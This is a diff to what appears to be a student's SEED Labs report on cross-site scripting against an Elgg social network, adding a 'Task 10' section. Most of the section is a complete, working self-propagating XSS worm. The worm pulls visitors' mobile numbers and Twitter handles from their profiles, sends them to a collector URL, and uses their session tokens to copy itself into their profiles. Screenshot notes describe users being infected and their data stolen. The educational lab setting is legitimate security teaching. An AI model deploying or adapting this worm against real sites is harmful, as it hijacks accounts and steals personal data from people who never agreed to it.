@@ -263,3 +263,66 @@ And her about me in the profile will be changed.
 
 
 * Task 10
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script id="worm" type="text/javascript">
+    window.onload = function() {
+      var username=elgg.session.user.username;
+      var settingsurl = `http://www.seed-server.com/profile/${username}`;
+      var Ajax=new XMLHttpRequest();
+      Ajax.onreadystatechange = () => {
+        if (Ajax.readyState === 4) {
+          (function(response) {
+              var hiddenDiv = document.createElement('div');
+              hiddenDiv.setAttribute("id", "hiddenDiv");
+              hiddenDiv.setAttribute("style", "display: none;");
+              hiddenDiv.innerHTML=response;
+              try{
+                var phone="@phone=" + encodeURIComponent(hiddenDiv.querySelector('[data-name="mobile"]').innerText);
+                var twitter="@twitter=" + encodeURIComponent(hiddenDiv.querySelector('[data-name="twitter"]').innerText);
+                var sendurl='http://localhost:5555?'+phone+twitter;
+                var AjaxI=new XMLHttpRequest();
+                AjaxI.open("GET", sendurl, true);
+                AjaxI.send();
+              }catch(e) {
+                  console.log(e);
+              }
+          })(Ajax.response);
+        }
+      }
+      Ajax.open("GET", settingsurl, false);
+      Ajax.send();
+
+      var name="&name="+elgg.session.user.name;
+      var guid="&guid="+elgg.session.user.guid;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+      var token="&__elgg_token="+elgg.security.token.__elgg_token;
+      var sendurl='http://www.seed-server.com/action/profile/edit';
+      var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+      var jsCode = document.getElementById("worm").innerHTML;
+      var tailTag = "</" + "script>";
+      var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+      var description='&description='+wormCode;
+      var content=name+guid+ts+token+description;
+
+      var Ajax=new XMLHttpRequest();
+      Ajax.open("POST", sendurl, true);
+      Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      Ajax.send(content);
+    }
+  </script>
+#+END_SRC
+
+
+** Screenshots
+  First Alice visits Samy's profile and gets herself infected and her mobile no and twitter username is sent to samy's machine.
+  [[./screenshots/task-10-stolen-alice.png]]
+  [[./screenshots/task-10-stolen-alice-requests.png]]
+  [[./screenshots/task-10-injected-worm-alice.png]]
+
+  Then Charlie visits Alice's profile and gets himself infected and his mobile no and twitter username is sent to samy's machine.
+  He also gets infected with the worm.
+  [[./screenshots/task-10-stolen-charlie.png]]
+  [[./screenshots/task-10-stolen-charlie-requests.png]]
+  [[./screenshots/task-10-injected-worm-charlie.png]]
+
